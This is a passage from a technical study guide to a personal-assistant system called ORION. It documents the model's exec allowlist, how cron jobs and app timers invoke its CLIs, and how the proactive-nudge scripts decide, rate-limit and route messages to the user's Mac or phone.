1. **The model through `exec`** (OpenClaw gateway agent `main`). Allowed only for programs listed by **full path** in `~/.openclaw/exec-approvals.json` (`security: allowlist`, `ask: off`, `askFallback: deny` for `main`). Allowlisted life-loop CLIs at snapshot time (names only): `orion-agenda`, `orion-standing`, `orion-remember`, `orion-recall`, `orion-note`, `orion-daily`, `orion-project`, `orion-project-run`, `orion-waiting`, `orion-now`, `orion-plan-study`, `orion-patterns`, `orion-checkin`, `orion-reschedule`, `orion-life`, `orion-watch`, `orion-watches`, `orion-tasks`. **Not** allowlisted: `orion-agenda-change`, `orion-mode`, `orion-undo`, `orion-why`, `orion-morning`, `orion-quick`, `orion-study`, `orion-next`, `orion-projects`, `orion-project-agent`, `orion-project-queue`. A call to a non-allowlisted script is refused rather than prompted. `plugin/orion-control/src/exec-routing.ts:35-42` keeps a parallel `WRAPPERS` list (a *subset*: it does not list `orion-reschedule`, `orion-tasks`, `orion-now`, `orion-checkin`, `orion-life`, `orion-plan-study`, `orion-patterns`, `orion-watch(es)`, `orion-waiting`, `orion-project-run`) used only to explain refusals; the exec allowlist file is the authority.
2. **The plugin's typed actions** (`orion_task_run` -> `plugin/orion-control/src/executors.ts` -> `runOrionScript(name, argv)` which `spawn`s `~/Desktop/ORION/scripts/<name>` with no shell). Only `orion-agenda-change` goes this way for these CLIs; it passes catalog tier, trusted-origin and approval checks first.
3. **The plugin's own schedule flow for the local model** (`plugin/orion-control/src/local-routing.ts:147-160`, `schedule-flow.ts:218-262`): `execFile("/Users/nickmadaio/Desktop/ORION/scripts/orion-reschedule", argv)` directly, no shell. It first runs `show --json`, makes the local 9B worker (`qwen3.5:9b` via Ollama `/api/chat`, `think:false`, temperature 0, `num_predict 500`, JSON-schema-constrained `format`) fill ONE small form whose block references are enums of today's real ids (`B1...`), then **code compiles the form to exact argv** (no arithmetic by the model) and runs it.
4. **The native apps** (Swift `Process`) running the installed copy under `~/.openclaw/orion-remote/scripts/` with the bundled node `~/.openclaw/tools/node-v24.15.0/bin/node`.
5. **OpenClaw cron** (inside the gateway) running `orion-standing` and `orion-daily` (3.12), and the plugin's `automation.ts` table of allowed automation actions.

**Table.**

| CLI / subcommand | Caller | Path from caller | Notes |
|---|---|---|---|
| `orion-reschedule <any>` | model (exec) | agent `main` exec by full path; `plugin/workspace/SCHEDULING.md` tells it which subcommand | allowlisted; work-check (`work-check.ts:183-205`) inspects the call string and stdout afterwards |
| `orion-reschedule show --json`, then compiled commands | plugin schedule flow | `local-routing.ts:147`, `:154` -> `schedule-flow.ts:218` | local worker fills a form; code runs argv |
| `orion-reschedule early [block\|out-of-class]` | Mac app | `native/Orion/Sources/Orion/AppState.swift:93-102` (`finishEarly`), `--check --dry-run` at `:85` | installed copy |
| `orion-reschedule early --check --dry-run`, `early block`, `early early-out-of-class` | phone-link app | `native/OrionLink/App/LinkEngine.swift:466-467`, `:503` | context JSON every 30 s cached; phone "I'm out early" buttons |
| `orion-tasks <list\|add\|set\|plan\|sub\|sweep>` | model (exec) | allowlisted | |
| `orion-tasks add "<title>"` | Mac app quick console | `native/Orion/Sources/Orion/Console.swift:326-328` | "add to-do" field |
| `orion-tasks sweep`, `orion-tasks plan` | `orion-watch tick` | `scripts/orion-watch:140-154` | every tick / once each morning |
| `orion-reschedule drop`, `day --plan` | `orion-tasks` | `scripts/orion-tasks:119`, `:157-161` | child process; same lock |
| `orion-agenda today\|upcoming\|tasks\|day\|deadlines` | model (exec) | allowlisted; exec-routing redirects `accli`/`orion-calendar` to it (`exec-routing.ts:60`) | read-only |
| `orion-agenda tasks`, `orion-agenda upcoming` | `orion-standing` | `scripts/orion-standing:158-174`, `:209-253` | parses the text format |
| `orion-agenda tasks` | plugin meeting-prep | `plugin/orion-control/src/executors.ts:3758` | `section("Tasks", "orion-agenda", ["tasks"])` |
| `orion-agenda today` | automation action `agenda_today` | `plugin/orion-control/src/automation.ts:106-110` | via an approved automation proposal |
| `orion-agenda-change add|remove-title|task-add|task-done` | plugin typed actions | `executors.ts:4241` (`changeCalendar`) after catalog gate | `calendar_event_add/remove`, `apple_reminder_add/complete` |
| `orion-standing auto\|morning\|evening\|check` | OpenClaw cron job `orion-standing-orders` (`0 * * * *`) | per `docs/learn/_fragments/raw/trace-proactive-nudge.md:199` | wrapped by `orion-cron-deliver`; `--notify` optional |
| `orion-standing check\|morning\|evening` | plugin automations | `automation.ts:91-104` | `standing_check/morning/evening` |
| `orion-daily` | OpenClaw cron job `orion-daily-memory` (`10 2 * * *`) | `trace-proactive-nudge.md:200`, `scripts/orion-setup:391-409` | `orion-daily && openclaw memory index` |
| `orion-daily` | plugin automation `daily_rollup` | `automation.ts:111-115` | risk medium |
| `orion-watch tick --json` | Mac app `LifeWatch` | `native/Orion/Sources/Orion/LifeWatch.swift:20-34` | every 5 min, installed copy |
| `orion-watches tick` | Mac app `LifeWatch` | `LifeWatch.swift:36-45` | same cycle, after `orion-watch` |
| `orion-checkin tick --json` | phone-link app | `LinkEngine.swift:89`, `:144-163` | every ~32 s |
| `orion-checkin started\|defer` | phone-link app (notification buttons) | `LinkEngine.swift:458-476` | |
| `orion-checkin add\|started\|done\|defer\|cancel\|list` | model (exec) | `plugin/workspace/AGENTS.md:73-77` | allowlisted |
| `orion-morning signal ...` | phone-link app | `LinkEngine.swift:447-455` | fire and forget |
| `orion-morning show` | `orion://morning-screen` URL scheme is its output side | `native/Orion/Sources/Orion/AppDelegate.swift:180`, `MorningScreen.swift:8` | |
| `orion-now`, `orion-patterns`, `orion-plan-study`, `orion-life` | model (exec) | `plugin/workspace/AGENTS.md:230-237`, `:186` | allowlisted |
| `orion-now --json` | `orion-morning` | `scripts/orion-morning:68` | planned wake time |
| `orion-quick` | Mac app quick menu | `native/Orion/Sources/Orion/Console.swift:226` | |
| `orion-project add|list|milestone|done|close` | model (exec) | allowlisted | read by `orion-standing morning` |
| `orion-project-run ...` | model (exec) | allowlisted (`AGENTS.md:440`) | phone included, since the phone talks to ORION |
| `orion-recall`, `orion-remember`, `orion-note` | model (exec) | allowlisted; `exec-routing.ts:88-89` forces `orion-recall` for memory | `orion-recall` also used by plugin prep (`executors.ts:3756`) |
| `orion-waiting` | model (exec) | allowlisted | read-only |
| `orion-why`, `orion-undo`, `orion-mode`, `orion-study`, `orion-next`, `orion-projects`, `orion-project-agent`, `orion-project-queue` | human at a terminal; the Mac app Projects tab for the last three **(inferred from the header of `orion-projects`/`orion-project-agent`)** | not allowlisted | `orion-mode` is also in `FORBIDDEN_SCRIPTS` for self-repair |

### 3.12 How cron, LaunchAgents and the apps actually invoke these

**LaunchAgents present** (`~/Library/LaunchAgents/`, names and run-modes only): `ai.openclaw.gateway` (RunAtLoad, KeepAlive; the OpenClaw gateway node process on port 18789, which hosts the model agent and its **cron store**), `com.nickmadaio.orion.dashboard` (RunAtLoad; `open -na Orion`, launches the Mac app), `com.nickmadaio.orion.remote` (RunAtLoad, KeepAlive; runs `orion-remote-bridge` through the integrity verifier), `com.nickmadaio.orion.tts`, `com.nickmadaio.orion.voiceid` (KeepAlive daemons). **No LaunchAgent calls any life-loop CLI directly** (no `StartInterval`/`StartCalendarInterval` among them). A former daily LaunchAgent `com.nickmadaio.orion.daily` was retired by `scripts/orion-setup` so there is one nightly pipeline in OpenClaw cron.

**`~/.openclaw/cron`** does not exist on this machine; the cron job store is inside the gateway (read with `openclaw cron list --json`, which I did not run). Job names and schedules from the existing docs (`docs/learn/_fragments/raw/trace-proactive-nudge.md:197-200`, `docs/learn/10_end_to_end_walkthroughs.md:1328`): `orion-focus-guard` `* * * * *` (runs `orion-focus check`; not in this section), `orion-standing-orders` `0 * * * *` (runs `orion-standing`), `orion-daily-memory` `10 2 * * *` (runs `orion-daily` then a memory index), all pinned to the home timezone, re-homed to Europe/London on 2026-09-25 per `PHASE_GATES.json`. These are **second-hand** (I did not read the live cron store). Cron output reaches Nick through `scripts/orion-cron-deliver` (header `:1-25`): the gateway had no chat channel installed, so `announce` delivery failed closed and "standing orders, focus nudges and the nightly memory summary executed on schedule and evaporated"; the wrapper runs the command and posts via `orion-discord-alert`. Live delivery history is in `~/.openclaw/orion-controlled/cron-delivery-history.jsonl`.

**The real driver of the life loop is the apps' own timers** (not launchd, not cron):
- Mac app: `DashboardView.swift:247` calls `lifeWatch.tick()`; `LifeWatch` (`native/Orion/Sources/Orion/LifeWatch.swift`) throttles to once per 5 minutes and, in a detached task, runs three scripts in sequence from the installed copy: `orion-watch tick --json`, `orion-watches tick`, `orion-proactive tick` (outreach with context; not in this section). It runs from the app because the app holds the Calendar permission. **If the Mac app is not running, none of these ticks fire.**
- Phone-link app (`native/OrionLink`): a 4-second loop; every 8th tick (~32 s) runs `orion-checkin tick --json` and drains `alerts-outbox.jsonl`; the phone's wake signals call `orion-morning`.
- The plugin's `automation.ts` is a **proposal registry** (approved automations stored under `~/.openclaw/orion-controlled/automations/`; the live `proposed/` folder was empty at snapshot) whose action table can only name five fixed argv arrays (`standing_check|morning|evening`, `agenda_today`, `daily_rollup`; `automation.ts:88-116`): "there is no entry that takes free text".

**Gotchas.** Cron jobs run with a minimal `PATH` that has no `node`, which is why `orion-standing` spawns `orion-agenda` via `process.execPath` (`orion-standing:152-157`) and why the app uses the full node path `~/.openclaw/tools/node-v24.15.0/bin/node`. Cron `announce` once had no route (above). `orion-standing` run by cron at 08:00 and 21:00 local resolves to `morning`/`evening` only because `auto` keys on the clock hour; a skipped hour (laptop asleep) means the hourly `check` band may be missed, and the "last call" band covers that (`orion-standing:685-691`).

**Walk it yourself.**
- `plutil -p ~/Library/LaunchAgents/com.nickmadaio.orion.dashboard.plist` (read-only).
- `sed -n 17,50p native/Orion/Sources/Orion/LifeWatch.swift`
- `sed -n 140,170p native/OrionLink/App/LinkEngine.swift`
- `python3 -c "import json;d=json.load(open('$HOME/.openclaw/exec-approvals.json'));print([a for a in d['agents']['main']['allowlist'] if 'orion-' in str(a)])"` (names only; the file also holds a socket token, so do not paste the whole file).

**Questions to ask your tutor.**
1. Why does the model's exec allowlist include `orion-reschedule` but not `orion-agenda-change`?
2. Why are the life-loop tickers inside the Swift apps rather than launchd jobs?
3. What happens to proactive check-ins when the Mac app is quit but the phone-link app keeps running?
4. How does the local-model schedule flow keep a 9B model from doing time arithmetic?
5. What is the difference between the two copies of each script and when do they diverge?

---


---

## 4. Reach and proactivity

This chapter covers how ORION starts a conversation with Nick instead of waiting to be asked: the nudge pipeline (`orion-proactive` -> `orion-reach` -> Mac voice, Mac bubble or phone), the morning briefing that rides on the same pipe, the "watches" that look at weather, texts and mail, and the older Discord-webhook path (`orion-cron-deliver`, `orion-discord-alert`, `orion-weather-alert`, `orion-notify`) that carries cron output and mission alerts. It also covers the two small device CLIs in this area, `orion-lights` and `orion-wake`, and `orion-login-item`.

Snapshot: branch `orion-v2/backlog-checkpoint`, HEAD `6c93032`, 2026-10-14. Every file in this chapter is committed; none exists only in the dirty worktree. As of today the installed copies under `~/.openclaw/orion-remote/scripts` are byte-identical to the repo for every script and library in this chapter (checked with `cmp`), except `orion-watch` (not part of this chapter), which is missing the `orion-tasks sweep` block from `6c93032`.

Key facts to keep in your head while reading:

- **No model writes the nudges.** The text of every proactive message is a fixed template in `scripts/lib/reach/proactive.mjs` (or `morning.mjs` for the briefing, or Swift for reminders). A model is involved in exactly two places in this chapter: (a) the local Ollama model `qwen3.5:9b` answers "important or skip" for texts and email in `orion-watches`; (b) the main OpenClaw model may decide to call `orion-reach "<its own words>"` when Nick asks, because `plugin/workspace/AGENTS.md:253` documents it.
- **The nudge is not started by cron or launchd.** It runs every 5 minutes from a timer inside the ORION Mac app (`native/Orion/Sources/Orion/LifeWatch.swift`). The cron jobs (focus guard, standing orders, daily memory) feed a separate path that ends at a Discord webhook.
- **Decisions are split into three layers**: what to say (`decide()` in `proactive.mjs`, pure), whether it may go out right now (`allowed()` in `route.mjs`, plus the eval-mode refusal), and which channel (`chooseChannel()` in `route.mjs`, fed by facts from `facts.mjs` and `presence.mjs`).
- **Quiet-hours "hold" is dead code today** (see 4.3 and 4.13, bug 1). The ledger confirms it: zero `hold` rows ever.

### In this chapter

| Section | Topic |
|---|---|
| 4.0 | Big picture, decision-flow diagram, timeline of one nudge |
| 4.1 | `orion-proactive` and `lib/reach/proactive.mjs` (who decides what to say) |
| 4.2 | `orion-reach` (the one sender; every flag) |
| 4.3 | Presence and routing: `facts.mjs`, `presence.mjs`, `route.mjs`, `orion-presence` |
| 4.4 | Delivery on the Mac and on the phone (Swift side) |
| 4.5 | The morning briefing: `morning.mjs`, `orion-morning`, `orion-lights`, `orion-wake` |
| 4.6 | Watches and triage: `reach/triage.mjs`, `reach/weather.mjs`, `orion-watches`, `notify/triage.mjs` |
| 4.7 | Path B: `orion-cron-deliver`, cron jobs, `orion-discord-alert`, `orion-weather-alert` |
| 4.8 | `orion-notify` (mission alerts) |
| 4.9 | `orion-login-item` |
| 4.10 | Eval-mode guard (`lib/eval-mode.mjs`) |
| 4.11 | What triggers what: cron, launchd, app timers |
| 4.12 | Weather code map |
| 4.13 | Known bugs and open issues |
| 4.14 | Tests |

---

### 4.0 Big picture

**What it is.** Two delivery systems live side by side.

- **Path A (new, 2026-10-07/08): presence-aware outreach.** `LifeWatch` in the Mac app runs three scripts every 5 minutes. One of them, `orion-proactive tick`, decides if anything is worth saying, then calls `orion-reach`, which picks a channel from where Nick is (Mac aloud, Mac silent bubble, or phone) and writes the message to a ledger and an outbox. The ORION Mac app and the ORION Link app pick those up.
- **Path B (older, Aug-Sep 2026): Discord webhook.** OpenClaw cron jobs run `orion-standing`, `orion-focus check` and `orion-daily` wrapped in `orion-cron-deliver`, which forwards any worthwhile output to `orion-discord-alert`, a one-way Discord webhook. `orion-notify` (mission events) and `orion-weather-alert` use the same webhook.

**Nothing in this chapter runs `openclaw message send` in practice.** Only `orion-notify` contains that code path (`scripts/orion-notify:231-237`) and `~/.openclaw/openclaw.json` has no `channels` block (per the dossier; I did not open the live config), so `orion-notify` always falls back to Discord.

#### Decision-flow diagram (Path A)

```
 ORION Mac app (dashboard window's 3 s RefreshTicker)            native/Orion/Sources/Orion/DashboardView.swift:39,245-247
   |  LifeWatch.tick(): self-throttled to once per 5 min          LifeWatch.swift:18-22
   v
 spawns, in order, with ~/.openclaw/tools/node-v24.15.0/bin/node (installed copies in ~/.openclaw/orion-remote/scripts):
   1) orion-watch tick --json      (day checks; not this chapter)
   2) orion-watches tick           (weather / texts / mail watches)  -> may call orion-reach
   3) orion-proactive tick         (this flow)
                    |
                    v
 orion-proactive tick                                              scripts/orion-proactive
   |-- sandbox() non-null?  (eval mode ON and sandbox calendar)  --yes--> exit 0 silently        :44
   |-- gather: presence(), orion-session status, focus-history.jsonl,
   |           orion-now --json (bed/wake), liveDay, commuteWalls, Reminders to-dos   :46-72
   |-- decide(ctx)  (pure, lib/reach/proactive.mjs)                   :74
   |       drops every key already in proactive-sent.json[today]
   |       -> list of {key, text, kind, urgent?}   (7 rule families)
   |-- for each message: spawnSync orion-reach "<text>" --kind K --why "proactive: KEY" [--urgent]   :77-82
   |       exit 0 ==> sent[key]=true   (even if orion-reach said NOT SENT!)   bug 2
   v
 orion-reach "<text>" ...                                          scripts/orion-reach
   |-- bad usage / bad --kind                         --> exit 2
   |-- not --dry-run and eval mode on (marker < 2 h)  --> "Not sent: ..." exit 0   :36
   |-- allowed(text, ledger):                         :44-45
   |       same normalised text within 2 h             --> "NOT SENT: already told him that recently." exit 0
   |       >= 6 non-hold rows in the last hour         --> "NOT SENT: already reached him 6 times this hour." exit 0
   |-- presence() -> facts {idle, locked, headphones, out, where, quiet}
   |-- channel decision (chooseChannel):               route.mjs:14-22
   |       --channel phone ........................... phone            (forced)
   |       --channel mac ............................. chooseChannel with idle=0, unlocked
   |       otherwise:
   |         quiet AND not --urgent ................... HOLD   (unreachable today: quiet is always false)
   |         locked / display asleep / idle >= 300 s .. PHONE
   |         headphones in ............................ MAC-VOICE
   |         out (class, fixed block, commute) ........ MAC-BUBBLE (silent)
   |         else ..................................... MAC-VOICE
   |       --silent turns MAC-VOICE into MAC-BUBBLE
   |-- --dry-run: print and exit 0 (nothing written)
   |-- append row to outreach.jsonl (the ledger)        :62
   |-- mac-*: /usr/bin/open -g "orion://reach?id=ID"    :63-66   (fails -> channel becomes "phone", 2nd ledger row)
   |-- not hold: append {id,text,kind,push} to outreach-outbox.jsonl   :68   push = (channel === phone)
   v
 Mac side: AppDelegate.application(open:) -> AppState.deliverReach(text, aloud, headphones, loud, listen)
           -> dashboard chat OR hologram bubble; if aloud: set volume, speak via TTS daemon
 Phone side: ORION Link app (Mac menu bar helper) LinkEngine.deliverOutreach (every 4 s):
           outbox line -> CloudKit LinkCommand chat record; push==true also -> LinkAlert -> iPhone notification
```

#### Who decides to reach out?

Three different "deciders", from earliest to latest:

1. **The app's 5-minute clock** decides *when to ask*. It has no opinion about content.
2. **`decide()`** in `scripts/lib/reach/proactive.mjs:17-78` decides *whether there is anything worth saying*. It is a hand-written rule table (4.1). This is the real "who decides" and it is entirely deterministic.
3. **`orion-reach`** decides *whether it may be said now and where*. It can veto (rate limit, duplicate, eval mode) and routes.

Other callers also feed `orion-reach`: `orion-watches` (weather/text/mail alerts), `orion-morning` (briefing), the Swift `announceReminder` (reminders Nick asked for, `AppState.swift:741-760`), and the main model when Nick asks for something to be said.

#### One nudge, as a timeline (example: bedtime)

1. 23:15, Nick is at the Mac at home, no focus session. `LifeWatch` fires; `orion-proactive tick` runs.
2. `orion-now --json` says bedtime 23:45 (default) so `toBed = 30`; the `bed-wind` rule (`proactive.mjs:68-69`) produces `"Bed at 11:45 PM — <first class> at <time> tomorrow. Start wrapping up."` kind `reminder`.
3. `orion-proactive` calls `orion-reach "<that text>" --kind reminder --why "proactive: bed-wind"`.
4. `orion-reach` checks the ledger, reads presence (idle 20 s, not locked, no headphones, not out), gets `mac-voice`, writes ledger row `reach-<ms>-<6hex>`, opens `orion://reach?id=...`.
5. The app finds the row, shows the text in the hologram bubble (or dashboard chat), sets volume to a sensible level (45 if unmuted and between 20 and 70) and speaks it through the TTS daemon.
6. The same text also lands in the outbox, so the ORION Link app copies it into the phone chat thread (no push, since `push` is false for Mac channels).
7. `orion-proactive` records `bed-wind` in `proactive-sent.json` for today so it will not fire again.

---

### 4.1 `orion-proactive` and `lib/reach/proactive.mjs` (what ORION says unprompted)

- **What it is** — `orion-proactive` is the glue script run every 5 minutes. It gathers context, hands it to the pure function `decide()` and sends each resulting message through `orion-reach`. `decide()` is a rule table: context in, `[{key, text, kind, urgent?}]` out. Each `key` is said at most once per day. The trigger for the whole file was a complaint from Nick quoted in the header comment (`scripts/lib/reach/proactive.mjs:1-4`): the app was telling him he should be asleep while he was out and inside a focus session. So bedtime rules are suppressed when he is in a session or away.
- **Where**
  - `scripts/orion-proactive:1-88` (whole script; `tick` at 43-88, `status` at 39-42).
  - `scripts/lib/reach/proactive.mjs:17-78` (`decide`), helpers at 10-15.
- **How it works**
  1. **Arguments** (`orion-proactive:30-31`). The command is the first non-`--` argument; `--dry-run` anywhere. `status` prints today's keys and exits. Anything other than `tick`/`status` prints usage and exits 2 (line 43).
  2. **Day key** (line 34): `new Date(now - 6h).toLocaleDateString("en-CA")`. A night belongs to the evening it started; until 06:00 it is still "yesterday", so a 00:30 `bed-late` nudge and a 23:50 `bed-now` share one day's dedupe ledger.
  3. **Eval guard** (line 44): `if (sandbox()) process.exit(0);` `sandbox()` (`scripts/lib/life/bridge-path.mjs:23-26`) is non-null only if eval mode is on AND the sandbox calendar file exists. If eval mode is on with no sandbox calendar, `tick` carries on and `orion-reach` refuses later (with exit 0, see bug 2).
  4. **Gather** (lines 46-72), each wrapped in try/catch so one failed source becomes empty rather than aborting:
     - `presence(now)` (4.3).
     - `orion-session status --json` for the focus session. If the status is not `running`/`paused` and the last row of `focus-history.jsonl` ended less than 15 minutes ago (`15 * 60000`, line 53), the session is treated as `{status: "finished", sessionId, endedMinute}` so the "session done" rule can fire.
     - `orion-now --json` -> `sleep.bedtime`, `sleep.wake` (`"HH:MM"` strings; defaults live in `decide`).
     - `liveDay(localDate(now))` for today's blocks, `commuteWalls(day, config)` for travel windows.
     - Focus total today: `focusToday(history, {dayKey})`, formatted by `formatFocusToday` with the `Focused today: ` prefix and `(latest...` suffix stripped; null under 60 s.
     - To-dos: `bridgeRequest("list_incomplete_reminders", {list: config.todoList})` through the Mac bridge (the same calendar/Reminders bridge the planner uses). Each to-do becomes `{title, dueDate, booked, waiting}`. `booked` means some day block's title overlaps the to-do title (case-insensitive substring either way). `waiting` means `waitsFor(notes, otherTitles)` found a dependency on another open to-do.
  5. **Decide** (74-75) with `ctx = {minute, day, session, travel, todos, today, tomorrow, out, where, idleSeconds, bed, wake, focusToday, sent}`.
  6. **Send** (77-82): for each message, if `--dry-run` print `DRY RUN would say (key): text`; otherwise `spawnSync(node, [orion-reach, text, "--kind", kind, "--why", "proactive: <key>", ("--urgent")], {timeout: 30000})`. `sent[key] = true` when the exit status is 0. The child's stdout is echoed.
  7. **Persist** (83-87): `proactive-sent.json` is rewritten atomically (`.tmp` + rename) as `{ "<YYYY-MM-DD>": { "<key>": true } }`, keeping the 7 newest days. It is only written when at least one message was produced.
  8. If nothing was produced: prints `Nothing to say (<where>[, in a focus session]).`
- **The rule table** (`decide()` in `proactive.mjs`). Internal helpers: `hm()` formats minutes as `h:mm AM/PM`; `ahead(from, to)` is minutes going forward through midnight; `toBed = ahead(minute, bed)`, `pastBed = ahead(bed, minute)`; `busy` is a session `running` or `paused`; `away = ctx.out`; defaults `bed = "23:45"`, `wake = "07:45"` (line 22).

| Key | Lines | Fires when | Text (template) | kind / urgent |
|---|---|---|---|---|
| `session-done-<sessionId>` | 29-36 | session `finished`, `endedMinute` known, and the end was <= 10 min ago | Normal: `Session done. <focusToday> today. Next: <title> at <time>.` Late (`pastBed <= 180`): `Session done. <focus> today. It's <time> — past bedtime; sleep now and you get <span>.` | `update`; late = `reminder` + urgent |
| `leave-<dest.start>` | 40-46 | a travel window starts in 5..15 min and Nick is not already out (`away` false). Fires even mid-session ("missing class matters more") | `Leave in <n> min for <title> at <time>.` | `reminder` |
| `gap-<floor(minute/180)>` | 47-57 | not busy, not away, 09:00 <= now <= 20:30, at least one open un-booked, un-blocked to-do, nothing on right now, and >= 60 min free until the next block (or until bedtime / 21:00) | `You're free until <time>. Want me to put <to-do> there?` (picks the earliest due date; undated sorts last) | `question` |
| `due-<title>-<date>` | 58-63 | 17:00 <= now <= 21:00; an open to-do is due today or tomorrow and not booked | `<title> is due today|tomorrow and nothing's booked for it — want me to find an hour tonight?` | `question` |
| `bed-wind` | 67-69 | not busy, not away, 0 < `toBed` <= 30 | `Bed at <time> — <first class> at <time> tomorrow. Start wrapping up.` (the class clause only if a fixed block >= 04:00 exists today) | `reminder` |
| `bed-now` | 70-71 | not busy/away, `pastBed <= 20` | `It's <time>, bedtime. Sleep now and you get <span> before your alarm.` | `reminder`, urgent |
| `bed-late` | 72-75 | not busy/away, 40 <= `pastBed` <= 150 and `idleSeconds < 300` (clearly at the Mac) | `Still up at <time> — <span> left before your alarm. Want me to move tomorrow's first block later?` | `question`, urgent |

  Notes: `gap-` buckets are 3-hour windows, so it can fire at most once per 3 h stretch. The `first` class for `bed-wind` uses today's `ctx.day`, not tomorrow's (the text says "tomorrow", which is approximate; **(inferred)** intended since bedtime is before midnight).
- **Contracts**
  - CLI: `orion-proactive tick [--dry-run]`, `orion-proactive status`. See the flag table below.
  - Files: reads `$ORION_CONTROLLED_DIR/focus-history.jsonl`; reads+writes `$ORION_CONTROLLED_DIR/proactive-sent.json` (default dir `~/.openclaw/orion-controlled`). Today's live file: `{ "2026-10-14": {...} }` style, 903 bytes at snapshot.
  - Env: `ORION_CONTROLLED_DIR`; `ORION_BRIDGE_BIN` (tests; makes `sandbox()` return null).
- **Flags of `orion-proactive`**

| Argument | Meaning |
|---|---|
| `tick` | Run the full gather/decide/send cycle once. Exit 0 normally; exit 0 silently in an eval sandbox. |
| `status` | Print `Said today: key1, key2` or `Nothing said today.`; exit 0. Read-only. |
| `--dry-run` (with `tick`) | Print `DRY RUN would say (key): text` for each message; send nothing and do not write `proactive-sent.json`. Note: it still runs `presence()` and the other readers (reads only). |
| (anything else) | `usage: orion-proactive tick [--dry-run] | status`, exit 2. |

- **Calls out to**: `orion-session status --json`, `orion-now --json` (each via `execFileSync(node, [script, ...])`, 15 s timeout, line 46), `orion-reach` (30 s timeout), Mac bridge `list_incomplete_reminders`, `ioreg`/`pmset`/`system_profiler`/`osascript` (via `facts.mjs`).
- **History**
  - `094ebe2` 2026-10-07 "ORION speaks first with context; no bedtime nagging in a session or out" (creation).
  - `26baa71` 2026-10-08 "more proactive; end/stop mean finish; thinking only for multi-part changes" (added the gap/due/leave style rules **(inferred from the title and the ledger: gap rows start 10-08)**).
  - Ledger tallies of `why: "proactive: …"` at snapshot (37-row `outreach.jsonl`, read by me): gap 12, bed 11, leave 5, session 1, due 1. (The dossier counted 35 rows and gap 10 earlier today; the file grew.)
- **Gotchas & lessons**
  - **Exit 0 means "marked as said", not "sent".** `orion-reach` exits 0 for `NOT SENT: ...` and for the eval refusal, so a held-back message is recorded as said for the whole day (bug 2).
  - Because the app runs it via the *installed copy*, editing the repo does nothing until the script is re-installed. All of this chapter's scripts match today, but that is a snapshot.
  - `decide()` has no memory of its own; all state is the `sent` map. A reboot mid-day loses nothing; deleting the file re-fires today's nudges.
  - The to-do read goes through the Mac bridge, which needs the app's Reminders/Calendar permission. That is one reason it runs from the app and not from cron (`LifeWatch.swift:9-11`).
- **Walk it yourself**
  - Open `scripts/lib/reach/proactive.mjs` and read lines 28-76; each `say(...)` is one row of the table above.
  - `sed -n 1,80p tests/reach-proactive.test.mjs` for worked examples (each test is a scenario).
  - `node scripts/orion-proactive status` (read-only; prints today's keys).
  - `node scripts/orion-proactive tick --dry-run` (read-only in effect: it reads Mac state and prints what it would say; it spawns no sender).
- **Questions to ask your tutor**
  1. Why does `decide()` take `sent` as an input instead of reading the file itself? What does that buy in tests?
  2. Walk through what happens at 00:30 if Nick is at the Mac, idle 40 s, bedtime was 23:45. Which keys can fire, and what is `dayKey`?
  3. Why does the `leave-` rule ignore `busy` but the `bed-*` rules do not?
  4. What would have to change so a message that `orion-reach` refuses is retried later instead of being marked sent?
  5. Why is the session-end window 10 minutes in `decide()` but the "treat as finished" window 15 minutes in `orion-proactive`?

---

### 4.2 `orion-reach` (the one sender)

- **What it is** — The single place where ORION starts a conversation with Nick. It enforces "no repeats, not too many, never during an evaluation", picks a channel from presence, writes the message to the ledger and to the phone outbox, and hands Mac-bound messages to the ORION app through a URL. Every proactive producer (`orion-proactive`, `orion-watches`, `orion-morning`, Swift reminders) goes through it. The header (`scripts/orion-reach:3-18`) says "every message lands in his ORION chat thread (phone and Mac), so he can answer normally".
- **Where** — `scripts/orion-reach:1-73` (arg parse 28-35, gate 44-45, decision 47-57, dry run 59, delivery 61-69, `describe` 71-73); `scripts/lib/reach/route.mjs`; `scripts/lib/reach/presence.mjs`; `scripts/lib/eval-mode.mjs`.
- **How it works**
  1. **Parse** (28-34). `flag(name)` returns the next argv. The message `text` is the first argument that does not start with `--` and is not the value of `--kind`, `--why` or `--channel`. Empty text prints usage and exits 2. `--kind` must be one of `reminder, warning, update, question, info, morning` (the usage string omits `morning`, but the check at line 34 accepts it and `orion-morning` uses it); default `info`.
  2. **Eval refusal** (36): `if (!dry) refuseDuringEval("reaching Nick")`. A `--dry-run` skips the refusal, so a dry run is the only mode that works during an evaluation.
  3. **Ledger load** (38-42): `LOG = $ORION_CONTROLLED_DIR/outreach.jsonl`, `OUTBOX = .../outreach-outbox.jsonl`; parsed line by line, bad lines ignored.
  4. **Rate/dup gate** (44-45): `allowed(text, history)` (4.3). On failure prints `NOT SENT: <reason>.` and exits **0**.
  5. **Presence + channel** (47-54). `here = await presence()` (reads the Mac, calendar and `orion-now`). Then:
```js
// scripts/orion-reach:50-54
let decision = forced === "phone" ? { channel: "phone", reason: "asked for the phone" }
  : forced === "mac" ? chooseChannel({ ...here, idleSeconds: 0, locked: false }, { urgent })
  : chooseChannel(here, { urgent });
// --silent: never aloud (he said he's in class, or anything else that needs quiet).
if (args.includes("--silent") && decision.channel === "mac-voice") decision = { channel: "mac-bubble", reason: `${decision.reason}; silent was asked for` };
```
  6. **Entry** (55-57): `id = "reach-<Date.now()>-<6 hex of a UUID>"`, row `{id, at, text, kind, why, channel, reason, urgent, headphones, loud, listen}` where `loud = --loud && !headphones` (never full volume into headphones) and `listen = --listen`.
  7. **Dry run** (59): prints the entry as JSON (with `--json`) or `DRY RUN — would <describe>`; exit 0; writes nothing.
  8. **Deliver** (61-68). Append the row to the ledger *first*. If the channel starts with `mac`, run `/usr/bin/open -g "orion://reach?id=<id>"` (5 s timeout). If `open` throws (app not running), flip `entry.channel = "phone"`, `entry.reason = "the ORION app isn't running"` and append a second ledger line with the same id. Unless the channel is `hold`, append `{id, text, kind, push: channel === "phone"}` to the outbox.
  9. **Output** (69): `Sent — <describe>` or the JSON entry.
- **Flags of `orion-reach`** (exhaustive; parsing is line 28-35 and 47-57):

| Flag / argument | Takes value | Default | Effect |
|---|---|---|---|
| `"<message>"` (positional) | the text | required | Message body. Trimmed. Empty -> usage, exit 2. No length cap. |
| `--kind K` | one of `reminder warning update question info morning` | `info` | Stored in ledger and outbox; shown on the phone chat; the app does not change routing on it. Other value -> exit 2. |
| `--why "..."` | free text | `null` | What prompted it. Stored only in the ledger (used for audits, e.g. `proactive: bed-wind`, `morning: phone unplugged at 07:14`). |
| `--urgent` | no | off | Bypasses the `hold` result in `chooseChannel` (quiet hours). Stored as `urgent`. Does **not** bypass the rate limit or dedupe. |
